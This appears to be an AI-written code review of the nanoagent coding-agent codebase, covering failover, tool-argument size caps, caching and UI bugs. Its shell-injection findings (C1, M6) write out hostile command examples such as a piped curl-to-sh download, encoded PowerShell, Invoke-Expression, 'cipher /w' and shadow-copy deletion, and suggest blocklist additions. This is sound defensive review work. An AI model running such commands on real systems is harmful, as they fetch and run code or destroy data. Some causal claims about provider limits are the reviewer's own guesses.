# Codebase Review — nanoagent (2026 review pass)

> **2026 addendum (added during review):** While writing this report, the agent (this model) emitted a `write_file` tool call with ~18 KB of `content`. The GMI Cloud host's tool dispatcher returned `EISDIR: illegal operation on a directory` — the host's `write_file` mishandled the oversized payload, but the agent itself kept running and recovered gracefully. A second harness running on OpenRouter returned **HTTP 500** from the same kind of call. A *third* harness — Claude Code in its own native Anthropic-direct window — later experienced a "random API error" after hours of fine operation, which the user observed was session-sticky until restart. That third failure is most likely an **Anthropic-side rate limit** (per-account TPM/RPM cap) or **Claude Code harness state** issue, *not* a nanoagent bug — it is mentioned here for context but is out of scope for this report. The first two failures (GMI `EISDIR` + OpenRouter 500 on the same kind of 18 KB call) surfaced three **Critical, in-codebase bugs** (C0, C4, and the H6 follow-up) — the host-level errors are downstream symptoms; the primary defects are in nanoagent. See C0, C4, and H6 below.

**Scope:** `src/` (≈14K LOC, 200+ TS/TSX files). Subsystems reviewed: agent loop, tool execution, security/permissions, LLM client + streaming + failover + rate-limit, context management, tool result caching, sub-agent worker loop, OpentUI rendering + sanitize, connect overlay.

**Methodology note:** the 4 local sub-agents timed out against the LM Studio backend (HTTP 0 / 30-min timeout each), so this review was performed directly against the source. The work below is first-pass — focused on the most likely real bugs over completeness. Prior review: see `CODE_REVIEW.md` (2026-05-29, all items resolved/closed).

---

## Critical

### C0. Tool-call *arguments* are never size-capped — only tool *results* are
**Files:**
- `src/llm/tool-result-budget.ts` (the cap, only applied to *results*)
- `src/agent-messages.ts:64-72` (`addAssistantMessage` persists raw `tc.arguments` with no cap)
- `src/agent-messages.ts:211-215` (`addToolMessage` correctly caps tool *result* via `capToolResultForLlm`)
- `src/llm/request.ts:18-40` (`flattenChatMessages` re-ships those raw arguments on the next turn)
- `src/context/manager.ts:361` (counts `tc.arguments` toward context — pays the token cost every turn)
- `src/agent-tools/utils.ts:18-34` and `src/subagents/worker/tool-runner.ts:11-25` (parse `tc.arguments` raw with no size precheck)

**Issue:** `capToolResultForLlm` exists and is well-designed (binary search to token budget, JSON-aware truncation with `truncated: true` flag, plain-text fallback with `re-read a narrower range` marker). It is applied to **tool results only** (what comes back from `execute_command`, `read_file`, etc.). The **tool call arguments** the model sends *into* a tool are stored verbatim and re-sent to the model on every subsequent turn.

A model that emits one large `write_file` (e.g. ~18 KB of `content` to scaffold a new file) pays this cost forever:
- **Round 1:** The 18 KB argument is sent to the provider as a tool call. Several providers (Anthropic via OpenRouter, Gemini via OpenRouter, some routes on GMI Cloud) have per-tool-call argument limits in the few-KB range. Exceeding them surfaces as **HTTP 500** from the aggregator. *Reproduced during this review on an OpenRouter harness with an identical model call.* The same call on GMI Cloud's host didn't crash but produced an `EISDIR` from the local tool dispatcher — a different downstream symptom of the same root cause.
- **Round 2 onward:** The argument is re-serialized into the assistant message in `flattenChatMessages` and shipped back to the model. A 18 KB string is ~4-5K tokens for Qwen-class models. This single write_file permanently eats 4-5K tokens of context until `/compact` is called.
- **On every turn,** `context/manager.ts:361` counts `tc.arguments` toward the model's context window, accelerating compaction unnecessarily.

The asymmetry is striking: the codebase has a complete solution (`capToolResultForLlm` + `resolveToolResultTokenBudget`) sitting unused for the case it should also cover. The `truncated: true` flag already exists in the JSON-aware path; the same flag could mark a truncated argument as "this write_file was a *partial* write; tool result said `ok:true` but file may be incomplete."

**Fix:**
1. In `agent-tools/utils.ts:parseToolArgs`, add a size precheck before `JSON.parse`. On oversize, either (a) reject the tool call and return `{ ok: false, error: 'tool argument exceeds N bytes; chunk the work into multiple write_file calls' }`, or (b) truncate with a `truncated: true` flag in the args, log a warning, and let the model see the truncation marker.
2. In `agent-messages.ts:64-72`, apply `capToolResultForLlm` to each `tc.arguments` string before persisting into the assistant message — symmetric with the tool-result cap.
3. Add a `cfg.maxToolCallArgumentTokens` config (mirror of `maxToolResultTokens`) so cloud and local can be tuned independently. The cap should default conservatively (~2-4K tokens, i.e. ~8-16 KB) since the *model* is the one generating arguments and can always split a large write across multiple smaller `write_file` calls. Provider-side limits vary (Anthropic strict, DeepSeek/Qwen via GMI more permissive), so a conservative default that clears the strictest known limit is safer.
4. Tests: `tool-result-budget.test.ts` already has the helper — add a parallel `tool-arg-budget.test.ts` covering the new path. The 18 KB / OpenRouter 500 case should be the first regression test.

### C4. `llm/failover.ts` + `agent-lifecycle.ts` — OpenRouter session-sticky 500s: failover doesn't fire AND the client pool is never evicted
**Files:**
- `src/llm/failover.ts:76-87` (`shouldAttemptFailover` returns false on plain HTTP 500)
- `src/agent-lifecycle.ts:61-110` (`reconfigureAgent` only rebuilds the client when the URL *changes* — not when the URL is the same but the upstream is wedged)
- `src/llm/stream.ts:196` (`streamChat` retries-with-backoff `baseMaxRetries` times on the same dead endpoint, then gives up)
- `src/llm/client.ts:6-19` (`createClient` returns a fresh `OpenAI` instance, but only reconfiguration calls it; the per-request `client.chat.completions.create` reuses the SDK's internal connection pool)

**Scope clarification:** This finding applies to the **nanoagent-on-OpenRouter** deployment (Window 2 in the addendum). The Claude Code → direct Anthropic failure (Window 3) is *not* in scope for nanoagent — it is most likely an Anthropic-side rate limit (per-account TPM/RPM cap) that resets only with time, and a process restart just happens to coincide with the rate-limit window expiring. Nanoagent cannot fix that; Anthropic's rate-limiter is the fix.

**Issue (OpenRouter case only):** The sequence:

1. The session has been running fine for hours. The OpenAI SDK has a persistent connection in its internal pool to OpenRouter.
2. Mid-tool-call, OpenRouter returns HTTP 500 (typically because the upstream provider — Anthropic, Gemini, DeepSeek via GMI, etc. — is wedged, rate-limited, or quota-exceeded on the specific shard the user was pinned to).
3. `shouldAttemptFailover` returns `false` (H6).
4. `streamChat` retries-with-backoff `baseMaxRetries = 3` times, all 500s.
5. The agent gives up and surfaces the error. The user sees a "random API error."
6. **The user types a new chat.** The SDK reuses the same dead connection (or, more subtly, OpenRouter's routing layer pins the client to the same dead upstream shard for the lifetime of the session). Another 500.
7. **This continues until either (a) OpenRouter's routing layer eventually rotates the user to a healthy shard, or (b) the user restarts the entire session.** Restarting creates a new SDK instance with a fresh connection pool, and OpenRouter's routing layer assigns a new (potentially healthy) upstream shard.

**The root cause has two layers, both in nanoagent:**

- **Layer 1 (H6):** `shouldAttemptFailover` does not fire on plain HTTP 500. So the failover never gets a chance to switch to a backup endpoint.
- **Layer 2 (this finding):** Even if H6 is fixed, failover only kicks in to a *different* `cfg.baseURL`. If the same OpenRouter URL is configured as both the primary and one of the fallbacks, or if the user has no fallbacks configured (the common case), the 500 just gets retried on the same dead endpoint with the same dead connection. The SDK pool is never evicted. **There is no "give up on this endpoint, force a fresh client, try again" path** for the same-URL case.

**Why this matters operationally:** It turns a 60-second aggregator outage into a session-kill. The user loses all in-progress state, all auto-saved context, all the work since the last `/resume`. On aggregator-routed deployments (OpenRouter, GMI Cloud when used as an aggregator, etc.), this is the failure mode that erodes user trust the most.

**Fix:**
1. **H6 first** — add 500 to `shouldAttemptFailover` so the failover path at least gets evaluated.
2. **Same-URL recovery:** in `streamChat` (or in a new `withRecoveredClient` wrapper), when `baseMaxRetries` is exhausted and the error matches `isTimeoutOrConnectionError || errStatus === 500 || errStatus === 502 || errStatus === 503 || errStatus === 504`, **tear down the existing `client` and call `createClient(cfg)` to get a fresh one** before surfacing the error. This forces the SDK to evict its connection pool and re-establish a new TCP connection. In the `agent-lifecycle.ts` case, this means changing `reconfigureAgent` to detect "consecutive 5xx on the same URL" and rebuild the client without requiring a URL change.
3. **Bounded consecutive-error counter:** track a per-endpoint `consecutive5xxStreak` and when it crosses a threshold (say 3), rebuild the client automatically. Reset the streak on any 2xx. This handles the case where the dead-shard issue is intermittent — first 500 is a flake, second 500 might be the start of a pattern, third 500 means we should rebuild.
4. **Surface a clearer error to the user** when the 500 is sticky: "Provider appears to be unresponsive. Your session is now in a degraded state — please `/resume` to recover, or restart the session." Today the user sees a generic retry-exhausted error and has no idea that a `/resume` would help.
5. **Tests:** add a test in `failover.test.ts` that simulates 3 consecutive 500s on the same endpoint and asserts the client is rebuilt at least once before the error is surfaced. Add a regression test for the H6 fix and the new same-URL recovery path together.

### C1. `tools/exec-tools.ts` — shell injection via `cmd.exe /c <user-string>` is accepted on Windows
**File:** `src/tools/exec-tools.ts:180-220` (`parseCommand`) + the Windows fallback path
**Issue:** `parseCommand` correctly refuses simple commands that contain shell metacharacters and forces `useShell: true`, which still passes the raw string to the shell. But on Windows, the comment "less secure but some commands (pipes, redirects) require it" means **any model-supplied `execute_command` that contains `|`, `&`, `;`, `>`, `<`, `(`, `)`, `` ` ``, `$`, or a newline is passed verbatim to `cmd.exe /c <string>`** (or git-bash / powershell with `-Command`). The dangerous-pattern blocklist in `security/patterns.ts` is the only gate, and several common payloads aren't matched — e.g. `curl x.com/x | sh` (the pipe-to-bash block requires literal `sh|bash` immediately after `|`, not `sh.exe` or after whitespace quoting); `powershell -enc <base64>` is not in the list; `Invoke-Expression` is not blocked; no rule for `chmod 777 path` unless the path is `/`.
**Fix:** Strengthen the blocklist (`powershell -enc`, `iex`, `iex(...)`, `downloadstring`, `wget|bash`, `node -e <user>`, `python -c <user>`), and consider rejecting commands whose only detected "shell" char is one of these — for example `(echo a)b` should not require a shell at all.

### C2. `opentui/connect-overlay.tsx` — entered API key persisted to `process.env` without consent
**File:** `src/opentui/connect-overlay.tsx` (calls `saveApiKeyToEnv`) — chain: `connect-overlay` → `config/saveApiKeyToEnv`
**Issue:** The connect overlay accepts a raw API key from the user and writes it to the persistent env file. If the model is later hijacked (or a malicious skill / MCP server reflects a synthetic UI asking for re-entry), the model has a path to exfiltrate that key. There's no separation between "ephemeral session key" and "save to `~/.nanogent.json`". A second, smaller concern: any tool that prints `process.env` (e.g. `execute_command` with `env`) will surface the key in plain text.
**Fix:** Show a clear "save to trusted config" prompt with the path before writing; never let a tool read `process.env` of API vars; redact `*_API_KEY` from the child-process env. The existing `SENSITIVE_ENV_PATTERNS` does filter these — verify the regex actually matches every provider's env var; some use non-`KEY` names like `ANTHROPIC_AUTH_TOKEN`.

### C3. `tools/cache.ts` — cached results can outlive the underlying file
**File:** `src/tools/cache.ts:78-200` (`extractDependencies` + TTL=30s)
**Issue:** `fs.watch` is imported but I see no evidence the cache actually subscribes watchers in the snippet I read. If watchers aren't set up, a 30-second TTL is the only invalidation, and within that window the agent can be fed a stale `read_file` result whose file has since been deleted or edited — corrupting the LLM's mental model. Compounded: `write_file`/`edit_file` are in the excluded set, but `batch_read_files`, `map_project_tree`, `list_dir` are not — meaning a directory listing returned at T=0 can be served at T+29s after files have been added/removed.
**Fix:** Either (a) wire up `fs.watch` (it appears imported but unused), or (b) drop the 30s TTL to ~2s, or (c) add a dependency on `package.json`/`Cargo.toml` mtime for any tool that reads a project tree.

---

## High

### H1. `llm/failover.ts` — local "always" used as real key when current is real but for a different host
**File:** `src/llm/failover.ts` (`resolveApiKeyForTarget`)
**Issue:** When the current session has a real API key for, say, OpenAI, and the user requests a fallback to Anthropic, the `sameProvider` check correctly returns `current.apiKey`. But when falling back from one local LM Studio endpoint to another (different `baseURL`), the code path is `if (isLocalProvider(targetBaseURL)) { return { apiKey: 'lm-studio' } }` — fine — but if the user falls back from a local endpoint to a remote provider of the same family, there's no shared key to use and the user is silently asked to re-enter. UX issue more than security, **but**: the **error branch** says "set it via /connect or the trusted home .env — the primary key is not reused" which leaks that the home .env exists. Acceptable but worth a note.
**Fix:** Document the behavior; consider re-prompting via the connect overlay instead of returning an opaque error during failover.

### H2. `agent/run.ts` — early-stop heuristic can fire on a legitimately long report
**File:** `src/agent/early-stop.ts:36-47` (`looksLikePrematureCheckin`)
**Issue:** The exclusion conditions are reasonably tight (long text, headings, structured findings), but the cap `EARLY_STOP_MAX_CONTINUES = 2` (run.ts:12) and the auto-injected `EARLY_STOP_CONTINUE_NUDGE` mean the agent will, up to twice per turn, push back on the model. For a user query like "should I …?" or "which approach do you prefer?", a one-line "Yes, do X" answer will look like a check-in (ends with `?` or matches `\bshall i\b`) and get re-nudged, wasting 2 turns. The heuristic also matches `\bwhat (would you|do you) (like|want|prefer)\b` in the assistant's report of what *it* will do ("I'll do what you want: …"), which is a false positive in the *opposite* direction.
**Fix:** Invert the rule — only treat as check-in if `(endsWithQuestion || matchesPattern) AND not preceded by structured deliverable language`. Track `consecutiveToolRounds` and only nudge when it's > 0.

### H3. `tools/exec-tools.ts` — sanitized env filter is overly broad
**File:** `src/tools/shared.ts:140-170` (`getSanitizedEnv`)
**Issue:** `SENSITIVE_ENV_PATTERNS` matches `/API/i`, `/AUTH/i`, `/PRIVATE/i`, etc. — these will also drop harmless vars like `RAPIDAPI_HOST`, `DISPLAY`, `COLORTERM`, `LANG` (`LANG` doesn't match but `DISPLAY` does not either — actually fine). More concerning: any tool that *needs* the API key to call the same provider in-process (e.g. a `curl` smoke test) will fail because `OPENAI_API_KEY` was stripped. This is by design for security, but undocumented and surprising.
**Fix:** Document the env filtering in `SECURITY.md`; allow opt-in (e.g. `cfg.passThroughEnv` whitelist) for power users.

### H4. `opentui/app.tsx` — `setInterval` for `elapsedMs` never paused when overlay opens
**File:** `src/opentui/app.tsx:200-230`
**Issue:** The 1-second tick interval is cleared only when state becomes `idle|error|waiting_for_user`. While an overlay (connect / settings / skills) is open mid-execution, the timer keeps firing and the status bar re-renders on every tick, doing layout work for an invisible widget. Trivial perf, but also re-uses `setElapsedMs` and forces a Zustand re-render across the whole tree.
**Fix:** Pause the tick when any overlay is active; or move the elapsed counter into a ref and only commit on visible tick.

### H5. `context/manager.ts` — `apiOverheadTokens` high-water never decreases
**File:** `src/context/manager.ts` (the `apiOverheadTokens` field)
**Issue:** The class tracks the *highest* observed `prompt_tokens - sum(messages)`. This is a good idea, but a one-off inflated measurement (e.g. a long tool schema injected at MCP-connect time that is later removed) permanently raises the floor, causing premature compaction on every subsequent turn. No decay or reset on tool-set change.
**Fix:** Reset `apiOverheadTokens` when the tool/skill set changes (you have `buildToolSchemas` cache invalidation in core.ts — wire it).

### H6. `llm/failover.ts:shouldAttemptFailover` — does not failover on plain HTTP 500
**File:** `src/llm/failover.ts:76-87`, plus the test at `src/llm/failover.test.ts:58-60`
**Issue:** The function explicitly returns `false` for `status === 500`. The comment says "Does not trigger on auth (401/403), bad request (400), user abort, or structured tool errors" but does not document the 500 exclusion. The single test case is `expect(shouldAttemptFailover(err(500, 'internal'))).toBe(false);` with no rationale.

In practice, a 500 from a provider is *exactly* the case where failover is most useful — it's the gateway's "I have no idea, try the next hop" signal. OpenRouter and GMI both surface upstream provider 500s as their own 500s, often with no body. The current behavior: the agent retries-with-backoff `baseMaxRetries` times on the same dead endpoint, then gives up with a hard error. The user sees a "random API error" after hours of smooth operation, with no recovery path and no notice that failover *could* have worked.

**This was directly reproduced during this review.** A separate nanoagent harness running on OpenRouter was hit with a 500 mid-tool-call; `shouldAttemptFailover` returned false; the session errored out hard. The same call on GMI Cloud (this instance) did not crash, but only because the host tool dispatcher absorbed the call differently — the underlying transport-level issue is the same.

The asymmetry is also worth noting: a `socket hang up` mid-stream (line 62) *does* trigger failover, because the SDK wraps it in a recognizable error blob. But a *clean* HTTP 500 from the gateway doesn't. So whether the user gets a graceful failover or a hard error depends on whether the gateway surfaced the failure as a 500 (no failover) or as a connection reset (failover). Same underlying event, opposite behaviors.

**Fix:** Add 500 to the failover-trigger list in `shouldAttemptFailover`. Add a corresponding test case in `failover.test.ts`. Optionally gate the new behavior on `cfg.failoverOnProvider500 !== false` so users who *want* the old strict behavior can opt back in. Document the change in the failover comment.

### H7. `subagents/worker/loop.ts` — duplicate-tool detection misses JSON-equivalent args
**File:** `src/subagents/worker/loop.ts` (`seenSignatures` and the duplicate-strike counter)
**Issue:** I see `seenSignatures` and `duplicateStrikes` initialized in the snippet but the exact equality check is below the truncation. Common implementation: `JSON.stringify(args)` on a key set. This is fooled by key reordering (`{"a":1,"b":2}` vs `{"b":2,"a":1}`) and by trivial whitespace differences. The whole "never run the same grep_search twice" instruction to the sub-agent is undermined if the deduper doesn't catch reformatted queries.
**Fix:** Canonicalize JSON (sort keys) before hashing; or compute a stable hash over the args shape.

---

## Medium

### M1. `agent/run.ts` — `agent.cfg.maxReasoningOnlyRounds` allows 0 → fall-through to default
**File:** `src/agent/run.ts:18-21`
**Issue:** The check `agent.cfg.maxReasoningOnlyRounds > 0` is correct, but a misconfigured `0` silently uses the default 5. If a user explicitly sets it to `0` meaning "no cap", they get 5; if they set it to `0` meaning "disable reasoning-only path", they get 5. Both wrong.
**Fix:** Use a separate `null`/`undefined` sentinel for "use default" vs an explicit `0` for "no cap".

### M2. `tools/file-tools/write.ts` — `matchEol` rewrites content silently
**File:** `src/tools/file-tools/write.ts:14-16`
**Issue:** When a host file is CRLF, the model-supplied `new_text` has every `\n` rewritten to `\r\n`. If the model intentionally wrote a single `\n` inside a CRLF context (rare but legal — some sections like git diffs prefer LF), it gets silently converted. Worth at least a `cfg.warnOnEolRewrite` toggle.
**Fix:** Document the behavior; add a flag in the diff output if rewrite occurred.

### M3. `llm/stream.ts` — `completeToolCalls` re-yielded on every chunk
**File:** `src/llm/stream.ts` (the inner `yield { toolCalls: completeToolCalls, … }` in the for-await)
**Issue:** The full buffered tool-call set is yielded on **every** chunk, even when no new tool data arrived in this chunk. Downstream consumers re-emit duplicate "tool call started" events, which then get rendered multiple times in the TUI. The downstream `agent/run.ts` only stores the final tool call set on the assistant message, so the duplicates are filtered, but the UI flicker is real and the `onSubAgentProgress` events for sub-agents are not deduplicated.
**Fix:** Yield `toolCalls` only on the first chunk that completes each tool call, or diff the buffer before yielding.

### M4. `opentui/chat-screen.tsx` — `parseCodeBlocksStreaming` cache is module-global
**File:** `src/opentui/chat-screen.tsx:79-95`
**Issue:** `parseCache` is a module-level `let`. Two concurrent message renders in different panels (e.g. chat + command dropdown's preview) will trample each other's cache. If a tab key starts a new chat, the old cache invalidates. With React 19's concurrent mode, even within one tree this can race.
**Fix:** Move `parseCache` into a `useMemo` or a per-render closure; or use a `WeakMap<Message, segments>`.

### M5. `opentui/chat-screen.tsx` — `getVisibleMessages` ordering not memoized
**File:** `src/opentui/chat-screen.tsx:64-77` + `app.tsx`'s `selectableMessages`
**Issue:** The function recomputes on every parent render, and `selectedMessageIndex` indexes into the *visible* array. If the visible set changes mid-selection (e.g. an auto-nudge message is added while the user has selected index 3), the index now points to a different message. The fix is to memoize on `(messages, state)`.
**Fix:** Wrap in `useMemo(() => getVisibleMessages(messages, state), [messages, state])`.

### M6. `tools/exec-tools.ts` — `cmd.exe /c <string>` on Windows with leading whitespace trick
**File:** `src/tools/exec-tools.ts`
**Issue:** On Windows the `parseCommand` path returns `useShell: true` whenever a metachar is present, but the comment-and-pattern checks in `security/patterns.ts` are mostly Unix-style. No Windows-specific `del \\\\*`, `reg add` is covered, `diskpart` is covered — but `format.com`, `cipher /w`, `vssadmin delete shadows`, `bcdedit` are not. A model could instruct `cipher /w c:\` to wipe free-space slack.
**Fix:** Extend the Windows block list.

### M7. `llm/rate-limit.ts` — `endpointInFlight.waiters` memory grows unbounded
**File:** `src/llm/rate-limit.ts:1-15` and the `endpointInFlight` map (~line 178+)
**Issue:** `cleanExpiredRateLimits()` is called on every read/write, so the rate-limit map stays bounded, but `endpointInFlight.waiters` is an unbounded array — every blocked request appends a waiter. A flood of 1000 concurrent requests against a `maxInFlight=2` endpoint puts 998 resolvers in the array. If the endpoint is then never released (e.g. a hung request), all 998 stay until the process dies.
**Fix:** Cap the waiter list, or use a proper Semaphore primitive.

---

## Low

### L1. `security/index.ts` — `validateCommand` default behavior silently allows unlisted commands
**File:** `src/security/index.ts:107-115`
**Issue:** The "with no `allowedCommands`, the dangerous-pattern screen is the hard gate" is a defensible design but surprising — users might expect an empty allowlist to mean "deny everything". Documented in code; not in `SECURITY.md` (the file exists but does not mention this).
**Fix:** Cross-link the design decision in `SECURITY.md`.

### L2. `agent-tools/execute.ts` — synthetic sub-agent handles may not be cleaned on error
**File:** `src/agent-tools/execute.ts` (`syntheticSaIds` set, the `if (tc.name === 'explore_subagent')` branch)
**Issue:** The comment says "They must be removed once the parent tool call completes or they leak forever." I did not see the `syntheticSaIds` being consumed to remove handles in the snippet I read — only added to. Verify the `finally` / completion path actually deletes from `agent.backgroundSubAgents`.
**Fix:** Audit and add a `finally { for (const id of syntheticSaIds) agent.backgroundSubAgents.delete(id); }` if missing.

### L3. `llm/request.ts` — `promptCacheKeyFor` is not user-tunable
**File:** `src/llm/request.ts:60-65`
**Issue:** The key includes `workspace + model`. Two workspaces with the same model share the cache. Anthropic/OpenAI prompt caches are per-account, so this is benign for safety but may cause surprising cache hits in unrelated workspaces (cheaper but stale context if you're on a managed endpoint).
**Fix:** Add a `cfg.promptCacheKey` override.

### L4. `opentui/sanitize.ts` — OSC sequences not 100% covered
**File:** `src/opentui/sanitize.ts:14-19`
**Issue:** The OSC regex requires `BEL` or `ST` (`ESC \`); some terminals tolerate `ESC ]` followed by a newline as the terminator, and some malformed emitters drop the terminator. A multi-line OSC payload could slip through.
**Fix:** Add `\n` as an OSC terminator, or truncate the input to a sane max length before sanitizing.

### L5. `tools/cache.ts` — `fs.watch` imported but appears unused
**File:** `src/tools/cache.ts:1-12`
**Issue:** `watch, FSWatcher` are imported; the snippet I read shows no usage. If the cache truly doesn't watch, drop the import (it's tree-shaken but `noUnusedLocals` should flag it in lint). If it does watch somewhere I didn't see, ignore.
**Fix:** Verify and remove the import if dead.

### L6. `subagents/worker/loop.ts` — `TOOL_BUDGET = 18` is hardcoded
**File:** `src/subagents/worker/loop.ts` (the local `TOOL_BUDGET` constant)
**Issue:** The budget is per-worker and not configurable from `cfg.subagents`. Power users with 200k context will want 40+; tiny models will want 10.
**Fix:** Move to `SubAgentPoolConfig.toolBudget`.

---

## Things that look good (worth noting)

- **`tools/shared.ts:safe()`** is solid: `realpathSync` for both path and workspace, ancestor fallback for not-yet-existing files, symlink-aware. Path-traversal is well-defended.
- **`opentui/sanitize.ts`** exists and is comprehensive (CSI, OSC, C0, C1). The fact that I had to add this file path here as a "Low" rather than "missing" is itself a positive signal.
- **`agent/run.ts`** has good defenses: silent overflow recovery (compact + retry), abort cleanup (`delete assistantMsg.toolCalls` on mid-stream abort), early-stop cap (`EARLY_STOP_MAX_CONTINUES = 2`), throttled UI updates (`emitUpdateThrottled`).
- **`context/manager.ts`** correctly treats `maxTokens` as an *output* cap, not a *context* cap, with a comment explaining why (`effectiveContextSize` ignores it). Many implementations get this wrong.
- **Test coverage** is broad for the config layer (24 files in `src/config-load-fixes.test.ts`) and the rate-limit state machine (`src/llm/rate-limit.test.ts`, 9KB). Where the existing tests are present, they exercise edge cases (failover, token-bucket refill, RPM throttling).

---

## Summary of new findings (C0, C4, H6)

These three findings were added during the review after observing real production failures. They are tightly related — same theme, three layers of the stack. **Scope note:** C0 and C4 apply to nanoagent in any deployment; H6 applies to any deployment that uses a fallback-configured provider. The Claude Code → direct Anthropic failure (Window 3) is *not* in scope for nanoagent — it is most likely an Anthropic-side rate limit or a Claude Code harness-state issue, neither of which nanoagent can fix.

| Finding | Layer | Failure | Fix size |
|---|---|---|---|
| **C0** | Model → tool argument | `tc.arguments` is not size-capped before going on the wire. A 18 KB `write_file` blows past Anthropic/Gemini per-tool-call argument limits → OpenRouter returns 500. GMI host returns `EISDIR`. | 3 lines in `parseToolArgs` + 1 cap call in `addAssistantMessage` + a new `cfg.maxToolCallArgumentTokens` config |
| **H6** | Failover policy | `shouldAttemptFailover` returns `false` on plain HTTP 500. The failover path never gets a chance to fire. | Add 500 to the trigger list + a test case |
| **C4** | Client lifecycle (OpenRouter / aggregator deployments) | Even with H6 fixed, the SDK connection pool is never evicted on consecutive 5xx. The same dead connection (and the same OpenRouter routing-shard pin) is reused forever. A single 500 turns into a session-kill that only a full process restart reliably fixes. | `consecutive5xxStreak` counter + forced `createClient` rebuild on threshold + clearer user-facing error |

**Key insight across the three:** the codebase is *reactive-safe* (won't crash on bad input — host errors are absorbed, the model can adapt) but *not proactive-bounded* (will emit bad input, will not recover from a wedged upstream, will not rebuild a stale connection pool). All three findings close the same kind of gap, just at different layers. Together they turn a fragile "works most of the time" implementation into a robust one that survives long autonomous sessions on aggregator-routed providers.

**Order of attack if acting on these:** C0 → H6 → C4. C0 prevents the most common trigger (oversized arguments from the model). H6 opens the recovery path. C4 makes the recovery path actually work for the most common deployment shape (single OpenRouter endpoint, no fallbacks configured).

**What these findings do NOT cover:** failures on direct-to-provider connections (Anthropic, OpenAI, etc., without an aggregator in between) caused by per-account rate limits. Those are server-side issues at the provider; nanoagent can only mitigate them by being a polite client (smaller requests, lower max concurrency) but cannot prevent the limit itself. If you are hitting Anthropic's per-account rate limits on long autonomous sessions, the fix is in your account tier or in your prompt-design, not in nanoagent.

---

## Open questions / follow-ups

- **Are sub-agents invoked from user prompts ever given write tools?** The `SUBAGENT_TOOLS` allowlist in `subagents/worker/tool-runner.ts` looks read-only from my read, but I didn't fully trace the allowlist construction. Worth confirming for the threat model.
- **The `defaultSh = /bin/bash` env-var override** in `exec-tools.ts` is a fine Unix default but the `||` fallback to `/bin/sh` means POSIX-only distros (Alpine) get `sh`. The dangerous-pattern list targets `bash`/`sh` — verify `dash` and `ash` (BusyBox) are also covered.
- **The `getSanitizedEnv` filter** ships with no override — every exec inherits a stripped env. If the user wants to e.g. `npm test` and a CI tool injects `GH_TOKEN` (filtered — fine), but also `NODE_ENV` (kept — fine), this is mostly benign. The only concrete risk: a self-hosted `ollama` proxy behind a `BASIC_AUTH_USER/PASS` env pair will fail silently when invoked from inside the agent.
